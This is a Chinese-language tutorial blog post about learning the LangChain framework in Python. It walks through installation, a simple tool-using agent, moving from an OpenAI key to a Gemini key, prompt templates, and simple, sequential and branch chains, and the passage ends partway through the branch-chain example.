                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">前言</h2>
<p>之前了解到了AI Agent 相关的一些基础概念，例如定义，LLM基础，Prompt Engineering，以及调 OpenAI API 等，接下来将介绍 LangChain 框架的基础知识和核心组件</p>
<h2 data-id="heading-1">LangChain 介绍</h2>
<p>LangChain 是一个用于构建代理和大型语言模型应用的框架。</p>
<p>简单理解就是可以使用 LangChain 框架快速开发基于大模型的Agent和应用，可以连不同AI模型供应商提供的API，包括数据库、API、文件系统等</p>
<h3 data-id="heading-2">主要模块</h3>
<ul>
<li><code>langchain-core</code>：核心抽象和基类</li>
<li><code>langchain-community</code>：社区贡献的集成和工具</li>
<li><code>langchain-openai</code>：OpenAI 模型集成</li>
<li><code>langchain-text-splitters</code>：文本分割工具</li>
<li><code>langchain-vectorstores</code>：向量存储集成</li>
</ul>
<h2 data-id="heading-3">官网文档地址</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fpython%2Flangchain%2Foverview" target="_blank" title="https://docs.langchain.com/oss/python/langchain/overview" ref="nofollow noopener noreferrer">docs.langchain.com/oss/python/…</a></p>
<h2 data-id="heading-4">安装</h2>
<p>环境使用 Python 3.10+ 版本，据说 3.10 版本是最稳定的版本，建议使用 3.10 版本</p>
<p>安装 <code>langchain</code> 和 <code>openai</code> 包，如果是准备使用其他模型供应商的API，也需要安装对应的包</p>
<pre><code class="hljs language-shell" lang="shell">pip install -U langchain

pip install -U langchain-openai
</code></pre>
<h2 data-id="heading-5">构建一个简单的智能体</h2>
<p>来看下官方的例子，引入 <code>create_agent</code> 函数，用于创建一个智能体，然后绑定一个工具函数 <code>get_weather</code>，用于获取天气信息，最后调用 <code>invoke</code> 方法来运行智能体</p>
<p><strong>注意！</strong>，这个天气函数是一个简单的示例，实际中可能需要调用外部的天气 API 来获取真实的天气信息，或者手动写个静态的，让它返回固定的天气信息，能跑起来就行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""Get weather for a given city."""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"It's always sunny in <span class="hljs-subst">{city}</span>!"</span>

agent = create_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    tools=[get_weather],
    system_prompt=<span class="hljs-string">"You are a helpful assistant"</span>,
)

<span class="hljs-comment"># Run the agent</span>
agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"what is the weather in sf"</span>}]}
)
</code></pre>
<p>官方的示例使用的 Claude 模型，需要改成 OpenAI 的模型，因为使用的是 OpenAI 的 Key，修改后的代码如下</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">import</span> os 
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv 
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI


<span class="hljs-comment"># 加载环境变量 </span>
load_dotenv() 

model = ChatOpenAI(
    model_name=<span class="hljs-string">"gpt-5-nano"</span>,
    api_key=os.getenv(<span class="hljs-string">"OPENAI_API_KEY"</span>),
    temperature=<span class="hljs-number">0</span>
)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""Get weather for a given city."""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"It's always sunny in <span class="hljs-subst">{city}</span>!"</span>

agent = create_agent(
    model=model,
    tools=[get_weather],
    system_prompt=<span class="hljs-string">"You are a helpful assistant"</span>,
)

<span class="hljs-comment"># Run the agent</span>
response = agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"what is the weather in sf"</span>}]}
)

<span class="hljs-comment"># 打印完整响应</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"完整响应:"</span>, response)

<span class="hljs-comment"># 如果响应包含结构化输出</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">'structured_output'</span> <span class="hljs-keyword">in</span> response:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"结构化输出:"</span>, response[<span class="hljs-string">'structured_output'</span>])

<span class="hljs-comment"># 或者如果响应包含消息</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">'messages'</span> <span class="hljs-keyword">in</span> response:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n完整对话流程:"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
    
    <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> response[<span class="hljs-string">'messages'</span>]:
        <span class="hljs-comment"># 根据消息对象类型确定角色</span>
        msg_type = <span class="hljs-built_in">type</span>(msg).__name__
        
        <span class="hljs-keyword">if</span> msg_type == <span class="hljs-string">'HumanMessage'</span>:
            role = <span class="hljs-string">'human'</span>
            content = msg.content
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"用户: <span class="hljs-subst">{content}</span>"</span>)
        <span class="hljs-keyword">elif</span> msg_type == <span class="hljs-string">'AIMessage'</span>:
            role = <span class="hljs-string">'ai'</span>
            content = msg.content
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"助手:"</span>)
            <span class="hljs-keyword">if</span> content:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  回复: <span class="hljs-subst">{content}</span>"</span>)
        
            <span class="hljs-comment"># 检查是否有工具调用</span>
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(msg, <span class="hljs-string">'tool_calls'</span>) <span class="hljs-keyword">and</span> msg.tool_calls:
                <span class="hljs-keyword">for</span> tool_call <span class="hljs-keyword">in</span> msg.tool_calls:
                    <span class="hljs-comment"># 尝试两种方式获取工具调用信息</span>
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-comment"># 先尝试作为对象访问</span>
                        tool_name = tool_call.name
                        tool_args = tool_call.args
                    <span class="hljs-keyword">except</span> AttributeError:
                        <span class="hljs-comment"># 如果失败，尝试作为字典访问</span>
                        tool_name = tool_call.get(<span class="hljs-string">'name'</span>, <span class="hljs-string">'unknown_tool'</span>)
                        tool_args = tool_call.get(<span class="hljs-string">'args'</span>, {})
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  工具调用: <span class="hljs-subst">{tool_name}</span>"</span>)
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  参数: <span class="hljs-subst">{tool_args}</span>"</span>)
        <span class="hljs-keyword">elif</span> msg_type == <span class="hljs-string">'ToolMessage'</span>:
            role = <span class="hljs-string">'tool'</span>
            content = msg.content
            <span class="hljs-comment"># 检查是否有工具名称</span>
            tool_name = <span class="hljs-built_in">getattr</span>(msg, <span class="hljs-string">'name'</span>, <span class="hljs-string">'未知工具'</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"工具 <span class="hljs-subst">{tool_name}</span> 结果: <span class="hljs-subst">{content}</span>"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># 处理其他类型的消息</span>
            content = msg.content <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(msg, <span class="hljs-string">'content'</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">str</span>(msg)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{msg_type}</span>: <span class="hljs-subst">{content}</span>"</span>)
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
</code></pre>
<p>运行后的效果如下</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a6c17ac6b594a5a9588072e50aa3da1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=%2FHlQ6P9sFqWf8Y9rsu4AXgiJB4c%3D" alt="" loading="lazy"/></p>
<p>重点改动是输出，因为 <code>agent.invoke</code> 运行后，就完了，没有任何输出</p>
<pre><code class="hljs language-python" lang="python">response = agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"what is the weather in sf"</span>}]}
)
</code></pre>
<p>开始我还以为没运行成功，后来搜一下才知道，需要单独打印完整响应，格式化处理才能看到想要的输出，前端选手直接用Python运行代码学习的必爬之坑</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a7812a8a3c34da8bfdd4aafea51e854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=zsBKWZ8Nogr1r07YZfZP%2B8K%2BFrA%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>为什么用Python,不直接用TS之类的去学习 LangChain 框架？</p>
<p>因为AI相关的Python生态是最完善的，其他语言也有，但是没有Python的生态完善，还有一个重要原因是，前端岗位已经要无了，直接用Python转后端或全栈，自己可能还能有一点点竞争力</p>
</blockquote>
<h2 data-id="heading-6">换Key继续</h2>
<p>因为 OpenAI 的免费账号申请的 Key 是有调用次数限制和频率限制，导致我在调试的时候，出现了报错的情况，搜了一下是 Key 调用次数多了，然后被限制了，这是问的 Google 具体描述如下</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d4081d290584ce9a106f08b3cb54af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=DvspKrjuLazjJIwSN3uO9sJLqGg%3D" alt="" loading="lazy"/></p>
<p>然后它提到了，Google AI Studio(Gemini API) 提供每天高达 1500 次的免费调用额度，哇哦，Google 可真是太豪了</p>
<p>还等什么，果断申请一个 Gemini API Key 继续学习</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c60cb7953274cd1a2dc4f42b4a70d36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=y9jVbzB7vDmLtqBwJHMeSsq8VP4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">Gemini API Key 配置</h2>
<p>在 .env 文件中添加 Gemini API Key</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eeb3251c8c134be2af94ce9e77f376f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=qW8n6qIJEE0bMWXB2O0OepSsNLo%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell">GEMINI_API_KEY=your_gemini_api_key
</code></pre>
<p>安装 Google GenAI SDK</p>
<pre><code class="hljs language-shell" lang="shell">pip install -q -U google-genai
</code></pre>
<p>重新创建一个文件，换上 Gemini API Key 测试一下请求，如果终端正确输出说明配置成功</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google <span class="hljs-keyword">import</span> genai
<span class="hljs-keyword">import</span> os 
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv 

load_dotenv() 

client = genai.Client(api_key=os.getenv(<span class="hljs-string">"GEMINI_API_KEY"</span>))

response = client.models.generate_content(
    model=<span class="hljs-string">"gemini-3-flash-preview"</span>, contents=<span class="hljs-string">"Explain how AI works in a few words"</span>
)
<span class="hljs-built_in">print</span>(response.text)

</code></pre>
<p>很简单的替换，把原来 OpenAI 的部分换成 Gemini API 就行了</p>
<h2 data-id="heading-8">核心组件</h2>
<p>接下来学习 LangChain 核心组件</p>
<h3 data-id="heading-9">Prompts（提示词）</h3>
<p>这个不多说了，与 LLM 最基本的交互方式，内容包含提示词模板、少样本提示、输出解析器等</p>
<p>下面是一个简单的翻译例子，让AI把中文翻译成英文</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建提示词模板</span>
prompt = ChatPromptTemplate.from_messages([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个专业的翻译助手。请将用户的中文文本翻译成英文。"</span>),
    (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{input}"</span>)
])

<span class="hljs-comment"># 初始化模型</span>
model = ChatGoogleGenerativeAI(model=<span class="hljs-string">"gemini-3-flash-preview"</span>)

<span class="hljs-comment"># 组合链</span>
chain = prompt | model

<span class="hljs-comment"># 执行</span>
result = chain.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"LangChain是一个强大的LLM应用开发框架。"</span>})
<span class="hljs-comment"># 只输出模型对话的结果</span>
<span class="hljs-built_in">print</span>(result.content[<span class="hljs-number">0</span>][<span class="hljs-string">'text'</span>])
</code></pre>
<p>最后我添加了打印 <code>result.content[0]['text']</code> ，只输出模型对话的结果，不然东西太多，影响调试，输出结果为如下内容</p>
<pre><code class="hljs language-shell" lang="shell">(venv) w@GYW:~/AIProjects/ai-agent-project/Gemini$ python langchain.py 
LangChain is a powerful LLM application development framework.
</code></pre>
<h3 data-id="heading-10">Chains（链）</h3>
<p>Chains 的作用是将多个组件组合在一起，形成一个完整的工作流程。包含以下类型：</p>
<ul>
<li>简单链（Simple Chains）</li>
<li>顺序链（Sequential Chains）</li>
<li>分支链（Branch Chains）</li>
<li>Runnable 接口</li>
</ul>
<p>下面的例子中使用了 langchain_core 包中的 <code>ChatPromptTemplate</code>、<code>StrOutputParser</code>、<code>RunnableParallel</code>、 <code>RunnableBranch</code>、 <code>RunnableLambda</code> 等函数功能</p>
<h4 data-id="heading-11">简单链（Simple Chains）</h4>
<p>上面的Prompts的代码中已经有了一个简单的翻译链</p>
<p>下面的简单链作用是将单个提示词和模型组合成一个简单的工作流</p>
<p>下面的这个函数添加了输出解析器，用于解析模型的输出，用 <code>StrOutputParser</code> 解析器能直接将将模型的输出转换为字符串</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_chain_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 1. 简单链（Simple Chains）示例 ==="</span>)
    
    <span class="hljs-comment"># 创建提示词模板</span>
    prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个专业的翻译助手。请将用户的中文文本翻译成英文。"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{input}"</span>)
    ])
    
    <span class="hljs-comment"># 组合链：提示词 → 模型 → 输出解析器</span>
    chain = prompt | model | output_parser
    
    <span class="hljs-comment"># 执行</span>
    result = chain.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"LangChain是一个强大的LLM应用开发框架。"</span>})
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"翻译结果: <span class="hljs-subst">{result}</span>"</span>)
    
    <span class="hljs-keyword">return</span> result

</code></pre>
<h4 data-id="heading-12">顺序链（Sequential Chains）</h4>
<p>顺序链的作用是将多个链按顺序连接，前一个链的输出作为后一个链的输入</p>
<p>重点看下面代码的 <code>full_chain = translate_prompt | model | output_parser | uppercase_chain | count_chain</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sequential_chain_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 2. 顺序链（Sequential Chains）示例 ==="</span>)
    
    <span class="hljs-comment"># 优化提示词模板格式</span>
    <span class="hljs-comment"># 第一个链：翻译中文到英文</span>
    translate_prompt = ChatPromptTemplate.from_template(
        <span class="hljs-string">"请将以下中文文本翻译成英文：{chinese_text}"</span>
    )
    translate_chain = translate_prompt | model | output_parser
    
    <span class="hljs-comment"># 第二个链：将英文文本转换为大写（使用Python内置函数替代模型调用）</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_uppercase</span>(<span class="hljs-params">text</span>):
        <span class="hljs-keyword">return</span> text.upper()
    uppercase_chain = RunnableLambda(to_uppercase)
    
    <span class="hljs-comment"># 第三个链：统计大写文本的单词数（使用Python内置函数替代模型调用）</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">count_words</span>(<span class="hljs-params">text</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(text.split()))
    count_chain = RunnableLambda(count_words)
    
    <span class="hljs-comment"># 组合顺序链：翻译 → 大写转换 → 单词计数</span>
    full_chain = translate_prompt | model | output_parser | uppercase_chain | count_chain
    
    <span class="hljs-comment"># 执行顺序链</span>
    input_text = <span class="hljs-string">"LangChain是一个强大的LLM应用开发框架。"</span>
    word_count_result = full_chain.invoke({<span class="hljs-string">"chinese_text"</span>: input_text})
    
    <span class="hljs-comment"># 分步执行以显示中间结果</span>
    translated_text = translate_chain.invoke({<span class="hljs-string">"chinese_text"</span>: input_text})
    uppercase_text = to_uppercase(translated_text)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"1. 原始文本: <span class="hljs-subst">{input_text}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"2. 翻译结果: <span class="hljs-subst">{translated_text}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"3. 大写转换: <span class="hljs-subst">{uppercase_text}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"4. 单词数量: <span class="hljs-subst">{word_count_result}</span>"</span>)
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"chinese_text"</span>: input_text,
        <span class="hljs-string">"english_text"</span>: translated_text,
        <span class="hljs-string">"uppercase_text"</span>: uppercase_text,
        <span class="hljs-string">"word_count"</span>: word_count_result
    }

</code></pre>
<h4 data-id="heading-13">分支链（Branch Chains）</h4>
<p>分支链的作用是根据输入条件选择不同的处理路径，就像普通代码的if-else语句一样，<code>RunnableBranch</code> 是实现分支逻辑的重点</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">branch_chain_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 3. 分支链（Branch Chains）示例 ==="</span>)
    
    <span class="hljs-comment"># 定义不同任务的提示词</span>
    translation_prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个专业的翻译助手。请将用户的中文文本翻译成英文。"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{content}"</span>)
    ])
    
    summarization_prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个专业的总结助手。请将用户的文本总结为一句话。"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{content}"</span>)
    ])
    
    explanation_prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个专业的解释助手。请用简单易懂的语言解释用户提到的概念。"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{content}"</span>)
    ])
    
    <span class="hljs-comment"># 创建不同任务的链</span>
    translation_chain = translation_prompt | model | output_parser
    summarization_chain = summarization_prompt | model | output_parser
    explanation_chain = explanation_prompt | model | output_parser
    
    <span class="hljs-comment"># 定义分支条件函数</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">route_by_task</span>(<span class="hljs-params">input_dict</span>):
        task = input_dict.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower()
        <span class="hljs-keyword">if</span> <span class="hljs-string">"翻译"</span> <span class="hljs-keyword">in</span> task:
            <span class="hljs-keyword">return</span> translation_chain
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"总结"</span> <span class="hljs-keyword">in</span> task:
            <span class="hljs-keyword">return</span> summarization_chain
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"解释"</span> <span class="hljs-keyword">in</span> task:
            <span class="hljs-keyword">return</span> explanation_chain
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># 默认返回翻译链</span>
            <span class="hljs-keyword">return</span> translation_chain
